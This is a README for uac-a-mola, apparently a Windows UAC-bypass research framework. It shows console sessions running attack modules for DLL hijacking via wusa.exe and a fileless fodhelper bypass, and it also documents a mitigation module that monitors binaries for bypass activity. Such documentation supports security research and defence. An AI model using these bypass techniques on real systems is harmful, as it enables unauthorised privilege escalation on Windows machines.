# uac-a-mola
# Installation
To install uac-a-mola you have to perform the following actions:
1. **Download and install python 2.7.x for Windows** taking into account your particular infrastructure, you can find the binaries here: https://www.python.org/downloads/
2. **Add the python path to the _path_ enviroment variable**. You can do this by carrying out the following steps:
    1. Right click to _mycomputer_ and left click to properties
    2. Left click to Advance system configuration
    3. Lef click to Enviroment Variables
    4. In the _system variables_ box, double left click to _Path_ 
    5. Left clicking into _New_ add the following paths:
        * C:\Python27\
        * C:\Python27\scripts\
3. **Download uac-a-mola tool from github** by downloading the .zip file or by clonning the repo.
4. **Open the folder _uac-a-mola-master_ with a cmd and execute the following command**:
```
pip install -r requirements.txt
```
Uac-a-mola is now ready to rock! You can test its functionality by typing:
```
cd uacamola
python uacamola.py
```
# Tutorial
This is a brief section that explains the use of some of the uac-a-mola modules:

## Attack modules
Using the attack modules is something very simple that hardly requires explanation. The only thing you have to do is load the corresponding module in the framework using the **_load_** command, you can see the options or input parameters using the **_show_** command, with the **_run_** command the module is executed:
```
uac-a-mola> load .\modules\attack\dll_hijacking_wusa.py
[+] Loading module...
[+] Module loaded!
uac-a-mola[dll_hijacking_wusa.py]> show

 |_Copy DLL with wusa.exe

 Description
 -----------
 |_It's used for copy a DLL in privilege path (wusa method win7/8/8.1)


 Options (Field = Value)
 -----------------------
 |_name_dll = comctl32.dll (name of DLL)
 |
 |_binary = compmgmtlauncher.exe (Path to the vulnerable binary)
 |
 |_malicious_dll = C:\Users\ieuser\Desktop\uac-a-mola\uacamola\payloads\comctl32\comctl32.dll (Path to a malicious dll)
 |
 |_name_folder = x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2 (Name folder)
 |
 |_destination_path = C:\Windows\System32 (Destination path)

```
And other example:
```
uac-a-mola> load modules\attack\fileless_fodhelper.py
[+] Loading module...
[+] Module loaded!
uac-a-mola[fileless_fodhelper.py]> show

 |_Fileless Fodhelper

 Description
 -----------
 |_Fileless - Fodhelper bypass UAC

 Options (Field = Value)
 -----------------------
 |_instruction = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C echo mola > c:\pwned.txt (Elevated Code)

uac-a-mola[fileless_fodhelper.py]> set instruction powershell.exe
uac-a-mola[fileless_fodhelper.py]> run
[+] Running module...
```
## Mitigate modules
Using the mitigation methods is also quite simple, but they have a slightly more complex internal structure that will be explained in this section. In relation to its use, the first thing that must be done is to load the available mitigation module:
```
uac-a-mola> load modules\mitigation\bypass_mitigation.py
[+] Loading module...
[+] Module loaded!
uac-a-mola[bypass_mitigation.py]> show

 Author
 ------
 |_Santiago Hernandez Ramos

 Name
 ----
 |_This module will instrument the binaries selected and detect possible UAC bypasses

 Description
 -----------
 |_Bypass Mitigation

 Options (Field = Value)
 -----------------------
 |_[REQUIRED] password = None (Password for connection)
 |
 |_[REQUIRED] binlist_file = None (File with a list of binaries to hook, one on each line)
 |
 |_port = 5555 (Port for connection)

```
In this case, we will need to set a password that the agents will use to comunicate with the listener that will be executed in uacamola framework. We can find the agents in the path _uacamola/support/agents_ , opening that files we can see the password:
```
fodhelper_ag = Agent('fodhelper.exe', 'localhost', 5555, 'uacamola')
fodhelper_ag.send_forbidden("Software\\Classes\\ms-settings\\Shell\\Open\\command")
```
_uacamola_ will be the password used for authentication and comunication, but we can change it.
The other parameter required is a path to a file that contains a list of binaries to monitor, this binaries must have an agent.pyw file in the agents paths.
```
uac-a-mola[bypass_mitigation.py]> show

 |_This module will instrument the binaries selected and detect possible UAC bypasses

 Description
 -----------
 |_Bypass Mitigation

 Options (Field = Value)
 -----------------------
 |_password = uacamola (Password for connection)
 |
 |_binlist_file = bins.txt (File with a list of binaries to hook, one on each line)
 |
 |_port = 5555 (Port for connection)

uac-a-mola[bypass_mitigation.py]> run
[+] Running module...
[+] Executing the listener...

--- Press ENTER for quit mitigate mode ---
```
Just filling this fields and executing the _run_ command, uacamola will start monitoring all the activity related to UAC bypass in the binaries that appear in the list. If dangerous activity is detected, it will automatically prune the dangerous branch (of the file system or registry) and it will execute the binary in a secure way. For exiting this mode we just need to press de _ENTER_ key.
